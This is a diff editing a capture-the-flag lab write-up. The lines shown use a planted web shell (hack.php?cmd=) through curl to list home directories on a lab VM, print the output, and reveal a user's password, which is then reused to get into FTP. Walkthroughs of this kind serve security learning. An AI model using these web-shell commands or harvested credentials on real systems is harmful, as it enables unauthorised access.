@@ -44,7 +44,7 @@ templates_c - dir which always need write permission, used for compiled template
 
 After that we can run something like this * https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd *
 
-Few commands later, we can see LOOKATME dir in home dir with users 
+Few commands later, we can see LOOKATME dir in home dir with other users 
 * curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' *
 drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
 drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
@@ -56,6 +56,6 @@ dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
 drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
 drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
 
-There is file password in this dir, which contains * lmezard:G!@M6f4Eatau{sF" *
+There is file password in LOOKATME dir, which contains * lmezard:G!@M6f4Eatau{sF" *
 
-This passwd fit to ftp port, which contains README file - "Complete this little challenge and use the result as password for user 'laurie' to login in ssh" and fun file (which need to decode).
+This password fit to ftp port, which contains README file - "Complete this little challenge and use the result as password for user 'laurie' to login in ssh", and fun file (which need to decode).
